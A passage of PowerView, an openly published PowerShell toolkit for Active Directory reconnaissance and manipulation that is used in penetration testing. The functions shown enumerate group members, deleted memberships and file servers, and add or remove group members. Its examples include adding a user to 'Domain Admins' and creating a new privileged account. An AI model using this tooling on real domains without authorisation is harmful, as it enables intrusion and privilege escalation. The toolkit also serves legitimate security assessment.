                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # if we're doing manual recursion
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
<#
.SYNOPSIS

Returns information on group members that were removed from the specified
group identity. Accomplished by searching the linked attribute replication
metadata for the group using Get-DomainObjectLinkedAttributeHistory.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectLinkedAttributeHistory

.DESCRIPTION

Wraps Get-DomainObjectLinkedAttributeHistory to return the linked attribute
replication metadata for the specified group. These are cases where the
'Version' attribute of group member in the replication metadata is even.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMemberDeleted | Group-Object GroupDN

Count Name                      Group
----- ----                      -----
    2 CN=Domain Admins,CN=Us... {@{GroupDN=CN=Domain Admins,CN=Users,DC=test...
    3 CN=DomainLocalGroup,CN... {@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...

.EXAMPLE

Get-DomainGroupMemberDeleted "Domain Admins" -Domain testlab.local


GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=testuser,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T23:07:43Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

GroupDN               : CN=Domain Admins,CN=Users,DC=testlab,DC=local
MemberDN              : CN=dfm,CN=Users,DC=testlab,DC=local
TimeFirstAdded        : 2017-06-13T22:20:02Z
TimeDeleted           : 2017-06-13T23:26:17Z
LastOriginatingChange : 2017-06-13T23:26:17Z
TimesAdded            : 5
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.DomainGroupMemberDeleted

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match 'member') -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'GroupDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'MemberDN' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeFirstAdded' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'TimesAdded' ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainGroupMemberDeleted] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Add-DomainGroupMember {
<#
.SYNOPSIS

Adds a domain user (or group) to an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and added
to the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to add members to.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Adds harmj0y to 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {
<#
.SYNOPSIS

Removes a domain user (or group) from an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and removed
from the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to remove members from.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Removes harmj0y from 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Removes harmj0y from 'Domain Admins' in the current domain using the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            'Identity' = $Identity
        }
        if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match '.+\\.+') {
                    $ContextArguments['Identity'] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the 'testing.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainFileServer -Credential $Cred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # short internal helper to split UNC server paths
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know it's not pretty)
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the 'testlab.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainDFSShare -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
